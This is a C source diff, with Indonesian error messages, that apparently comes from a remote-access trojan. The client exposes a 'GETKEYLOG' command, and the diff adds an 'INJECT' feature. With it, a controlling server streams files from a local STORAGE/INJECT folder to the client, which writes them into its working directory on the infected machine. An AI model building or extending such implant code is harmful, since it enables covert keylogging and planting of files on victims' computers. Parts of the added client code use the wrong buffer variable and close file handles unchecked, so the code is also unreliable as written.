@@ -23,7 +23,7 @@
 int openFolder(char * path){
 	DIR * dir = opendir(path);
 	if (!dir) {
-		perror("Gagal membuka folder");
+		printf("Gagal membuka folder");
 		return 1;
 	}
 
@@ -396,7 +396,7 @@ void * getMessageController (void * vParam){
 				GETFILE = 0; memset(buffer, '\0', sizeof(buffer));
 				fclose(fp); fp = NULL; continue;
 			}else if(strcmp(buffer, "INJECT") == 0){
-				openFolder(".");
+				GETFILE = 51; openFolder("./STORAGE/INJECT"); continue;
 			}
 
 			if(GETFILE == 0) printf("%s\n", buffer);
@@ -418,6 +418,32 @@ void * getMessageController (void * vParam){
 					perror("Gagal membuat folder");
 				}
 				GETFILE = 0; continue;
+			}else if(GETFILE == 51){
+				char buffer2[128] = {0};
+				char buffer3[128] = {0};
+				strcpy(buffer3, buffer);
+				strcpy(buffer2, "./STORAGE/INJECT/");
+				strcat(buffer2, buffer);
+				fp = fopen(buffer2, "r");
+				if(fp == NULL) {GETFILE = 0; continue;}
+
+				strcpy(buffer, "INJECT");
+				send((param)->clientSocket, buffer, strlen(buffer), 0);
+				memset(buffer, '\0', sizeof(buffer));
+				usleep(100001);
+				strcpy(buffer, buffer3);
+				send((param)->clientSocket, buffer, strlen(buffer), 0);
+				memset(buffer, '\0', sizeof(buffer));
+				usleep(100001);
+				while(fgets(buffer, sizeof(buffer), fp) != NULL){
+					send((param)->clientSocket, buffer, strlen(buffer), 0);
+					usleep(100001);
+					memset(buffer, '\0', sizeof(buffer));
+				}
+				strcpy(buffer, "ENDINJECT");
+				send((param)->clientSocket, buffer, strlen(buffer), 0);
+				memset(buffer, '\0', sizeof(buffer));
+				usleep(100001);
 			}
 
 			memset(buffer, '\0', sizeof(buffer));
@@ -512,7 +538,7 @@ DWORD WINAPI execMessage(LPVOID paramTh){
 	addCommand("GETKEYLOG", (void *)GETKEYLOG, normalCommandPack);
 
 	unsigned char SURFMODE = 0;
-
+	FILE * fp = NULL;
 	while(1){
 		while((param->paramT)->socketStatus == 'c' || (param->paramT)->socketStatus == 's'){
 			recv_size = recv((param->paramT)->clientSocket, server_reply, sizeof(server_reply), 0);
@@ -529,16 +555,35 @@ DWORD WINAPI execMessage(LPVOID paramTh){
 					SURFMODE = 0;
 					memset(server_reply, '\0', sizeof(server_reply));
 					continue;	
+				}else if(strcmp(server_reply, "INJECT")==0){
+					SURFMODE = 2;
+					memset(server_reply, '\0', sizeof(server_reply));
+					continue;	
+				}else if(strcmp(server_reply, "ENDINJECT")==0){
+					SURFMODE = 1; fclose(fp);
+					memset(server_reply, '\0', sizeof(server_reply));
+					continue;	
 				}
 
 				if (SURFMODE == 0) proccess(server_reply, param->paramT, normalCommandPack);
 				else if (SURFMODE == 1) strcpy((param)->input, server_reply);
+				else if (SURFMODE == 2){	
+					char buffer2[512] = {0};
+					strcpy(buffer2, (param)->pwd);
+					strcat(buffer2, "/");
+					strcat(buffer2, buffer);
+					fp = fopen(buffer2, "w");
+
+					SURFMODE = 3;
+				}else if(SURFMODE == 3){
+					fputs(buffer, fp);
+				}
 
 				//printf("Server reply: %s\n", server_reply);
 				memset(server_reply, '\0', sizeof(server_reply));
 			}
 		}
-		Sleep(1000);
+		Sleep(100);
 	}
 
 	return 0;
